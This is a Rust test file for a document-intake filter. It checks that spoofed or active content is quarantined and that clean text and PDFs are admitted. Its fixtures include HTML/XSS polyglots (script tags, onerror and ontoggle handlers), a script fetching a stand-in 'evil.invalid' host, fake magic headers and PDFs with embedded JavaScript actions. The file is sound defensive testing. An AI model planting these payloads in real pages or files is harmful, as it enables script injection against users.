//! Admission `ADM-0007` (`T12`); see `PROVENANCE.md`.

use safeevidence_contracts::document_intake::{
    DocumentDenyReason, DocumentIntakeRequest, DocumentMimeClass, QuarantineDecision, mime_decision,
};

#[test]
fn denied_mime_classes_quarantine() {
    for mime in [
        DocumentMimeClass::ApplicationOctetStream,
        DocumentMimeClass::TextHtml,
        DocumentMimeClass::OfficeOpenXml,
        DocumentMimeClass::ApplicationJavascript,
        DocumentMimeClass::Unknown,
    ] {
        let req = DocumentIntakeRequest {
            mime,
            bytes: b"hostile".to_vec(),
            fixture_id: Some("hostile".to_owned()),
        };
        let (decision, reason) = mime_decision(&req);
        assert_eq!(decision, QuarantineDecision::Quarantine);
        assert_eq!(reason, DocumentDenyReason::MimeDenied);
    }
}

#[test]
fn empty_and_spoofed_magic_payloads_quarantine() {
    let empty = DocumentIntakeRequest {
        mime: DocumentMimeClass::TextPlain,
        bytes: vec![],
        fixture_id: None,
    };
    assert_eq!(
        mime_decision(&empty),
        (
            QuarantineDecision::Quarantine,
            DocumentDenyReason::EmptyPayload
        )
    );

    // HTML/script polyglot disguised as text/plain is quarantined.
    let polyglot = DocumentIntakeRequest {
        mime: DocumentMimeClass::TextPlain,
        bytes: b"  <script>fetch('http://evil.invalid')</script>".to_vec(),
        fixture_id: Some("html-polyglot".to_owned()),
    };
    assert_eq!(
        mime_decision(&polyglot),
        (
            QuarantineDecision::Quarantine,
            DocumentDenyReason::MimeDenied
        )
    );

    // UTF-8 BOM, Unicode NBSP, XML/SVG inline handler, and mid-document <script> polyglots quarantine.
    for (label, payload) in [
        (
            "utf8-bom-script",
            "\u{feff}<script>alert(1)</script>".as_bytes(),
        ),
        (
            "nbsp-html",
            "\u{00a0}<html><body>x</body></html>".as_bytes(),
        ),
        (
            "xml-svg-onload",
            b"<?xml version=\"1.0\"?><svg onload=\"x()\"/>",
        ),
        ("img-onerror", b"Plain intro\n<img src=x onerror = \"y()\">"),
        ("img-slash-onerror", b"<img/src=x/onerror=alert(1)>"),
        ("img-quote-onerror", b"<img src=\"x\"onerror=alert(1)>"),
        (
            "img-quoted-lt-onerror",
            b"<img title=\"<1\" onerror=alert(1)>",
        ),
        (
            "img-quoted-gt-onerror",
            b"<img title=\">\" onerror=alert(1)>",
        ),
        (
            "details-ontoggle",
            b"p < 0.05 <details/open/ontoggle=alert(1)>",
        ),
        (
            "mid-body-script",
            b"Title: Synthetic\n\n<SCRIPT>evil()</SCRIPT>",
        ),
        ("html-comment", b"<!-- polyglot --> text"),
    ] {
        let req = DocumentIntakeRequest {
            mime: DocumentMimeClass::TextPlain,
            bytes: payload.to_vec(),
            fixture_id: Some(label.to_owned()),
        };
        assert_eq!(
            mime_decision(&req),
            (
                QuarantineDecision::Quarantine,
                DocumentDenyReason::MimeDenied
            ),
            "polyglot {label} must quarantine"
        );
    }

    // NUL / control bytes in plain text quarantine as InvalidUtf8Text.
    let nul_text = DocumentIntakeRequest {
        mime: DocumentMimeClass::TextPlain,
        bytes: b"Plain text\x00with embedded nul".to_vec(),
        fixture_id: Some("nul-text".to_owned()),
    };
    assert_eq!(
        mime_decision(&nul_text),
        (
            QuarantineDecision::Quarantine,
            DocumentDenyReason::InvalidUtf8Text
        )
    );

    for (label, payload) in [
        ("ascii-zip", &b"PK\x03\x04\x14\x20\x20\x20stored"[..]),
        ("pdf-as-text", &b"%PDF-1.7\n1 0 obj"[..]),
        ("space-bom-pdf", " \u{feff}%PDF-1.7\n1 0 obj".as_bytes()),
    ] {
        let req = DocumentIntakeRequest {
            mime: DocumentMimeClass::TextPlain,
            bytes: payload.to_vec(),
            fixture_id: Some(label.to_owned()),
        };
        assert_eq!(
            mime_decision(&req),
            (
                QuarantineDecision::Quarantine,
                DocumentDenyReason::MagicHeaderMismatch
            ),
            "container magic {label} must quarantine"
        );
    }

    // Non-PDF bytes declared as ApplicationPdf are quarantined on magic-header mismatch.
    let fake_pdf = DocumentIntakeRequest {
        mime: DocumentMimeClass::ApplicationPdf,
        bytes: b"MZ\x90\x00executable-pretending-to-be-pdf".to_vec(),
        fixture_id: Some("fake-pdf".to_owned()),
    };
    assert_eq!(
        mime_decision(&fake_pdf),
        (
            QuarantineDecision::Quarantine,
            DocumentDenyReason::MagicHeaderMismatch
        )
    );

    // PDF with embedded active /JavaScript, compact <</S/JavaScript...>>, '%'-in-string, or /J#53 action is quarantined.
    for payload in [
        &b"%PDF-1.7\n<< /S /JavaScript /JS (app.alert(1)) >>"[..],
        &b"%PDF-1.7\n<</S/JavaScript/JS(app.alert(1))>>"[..],
        &b"%PDF-1.7\n1 0 obj << /Title (100%) /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj"[..],
        &b"%PDF-1.7\n<< /J#53(app.alert(1)) >>"[..],
    ] {
        let active_pdf = DocumentIntakeRequest {
            mime: DocumentMimeClass::ApplicationPdf,
            bytes: payload.to_vec(),
            fixture_id: Some("active-pdf".to_owned()),
        };
        assert_eq!(
            mime_decision(&active_pdf),
            (
                QuarantineDecision::Quarantine,
                DocumentDenyReason::MimeDenied
            )
        );
    }

    // Valid bounded UTF-8 text (including '< 0.05' followed by 'onset = 3') and benign PDFs pass.
    let clean_text = DocumentIntakeRequest {
        mime: DocumentMimeClass::TextPlain,
        bytes: b"Synthetic study report (p < 0.05). Median onset = 3 days, n > 40.".to_vec(),
        fixture_id: Some("clean-txt".to_owned()),
    };
    assert_eq!(
        mime_decision(&clean_text),
        (
            QuarantineDecision::AdmitToSandboxedParser,
            DocumentDenyReason::None
        )
    );

    let clean_pdf = DocumentIntakeRequest {
        mime: DocumentMimeClass::ApplicationPdf,
        bytes: b"%PDF-1.7\n% https://example.org/json\n1 0 obj << /Type /Catalog /URI (https://example.org/jss) >> endobj".to_vec(),
        fixture_id: Some("clean-pdf".to_owned()),
    };
    assert_eq!(
        mime_decision(&clean_pdf),
        (
            QuarantineDecision::AdmitToSandboxedParser,
            DocumentDenyReason::None
        )
    );
}
